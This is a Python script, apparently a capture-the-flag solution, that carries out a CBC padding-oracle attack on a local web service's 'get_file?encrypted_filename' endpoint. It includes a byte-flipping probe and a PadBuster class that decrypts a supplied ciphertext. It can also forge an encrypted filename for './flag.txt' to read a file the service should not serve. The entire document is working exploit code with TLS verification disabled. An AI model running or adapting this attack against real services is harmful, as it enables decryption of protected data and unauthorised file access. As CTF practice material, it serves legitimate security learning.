# https://github.com/elttam/ctf-fanclub
from cryptopal import * # https://github.com/lanjelot/cryptopal
from hashlib import md5
import requests
from http.cookiejar import DefaultCookiePolicy
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def flipit():
    orig = unhexlify('40a0f27a299f492d5dbbdccb054b5236f6dbea585e832b7ea4258f934429f80c7bc4fe6d260df1b170732ef7d514f330bc8fa46a6ccf055a458cf58cd1e0d1d2')

    def send(ct):
        url = b'http://localhost/get_file?encrypted_filename=%s' % hexlify(ct)
        return requests.get(url)

    r = send(orig)
    h = md5(r.content).hexdigest()
    print('xxx %d %d %s' % (r.status_code, len(r.content), h))

    for i, r in byteflip(orig, send):
        print('%3d %d %d %s' % (i, r.status_code, len(r.content), h))

class CustomCookiePolicy(DefaultCookiePolicy):
    def __init__(self, accepted_cookies):
        self.accepted_cookies = accepted_cookies
        DefaultCookiePolicy.__init__(self)

    def set_ok(self, cookie, request):
        if cookie.name in self.accepted_cookies:
            return DefaultCookiePolicy.set_ok(self, cookie, request)
        else:
            return False

PROXIES = {} #'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        PaddingOracle.__init__(self, **kwargs)
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.session.cookies.set_policy(CustomCookiePolicy([]))

    def oracle(self, data, **kwargs):
        ct = data.hex()
        url = 'http://localhost/get_file?encrypted_filename=%s' % ct
        cookies = {'kikoo': 'lol'}

        r = self.session.get(url, cookies=cookies)
        logging.info('%s %d %d %d %.3f' % (ct, r.status_code, len(str(r.headers)), len(r.content), r.elapsed.total_seconds()))

        if r.status_code == 500:
            raise PaddingException

if __name__ == '__main__':
    import logging
    from sys import argv

    logging.basicConfig(format='%(threadName)s %(levelname)7s - %(message)s', level=logging.DEBUG)
    logging.getLogger('requests.packages.urllib3.connectionpool').setLevel(logging.ERROR)

    padbuster = PadBuster()

    if len(argv) > 1:
        encrypted = padbuster.encrypt(b'./flag.txt', block_size=16)
        print('Encrypted: %s %s' % (encrypted, encrypted.hex()))

    else:
        ct = bytes.fromhex('40a0f27a299f492d5dbbdccb054b5236f6dbea585e832b7ea4258f934429f80c7bc4fe6d260df1b170732ef7d514f330bc8fa46a6ccf055a458cf58cd1e0d1d2')
        print('Decrypting ct:', ct)

        pt = padbuster.decrypt(ct, block_size=16)
        print('Decrypted:', pt)

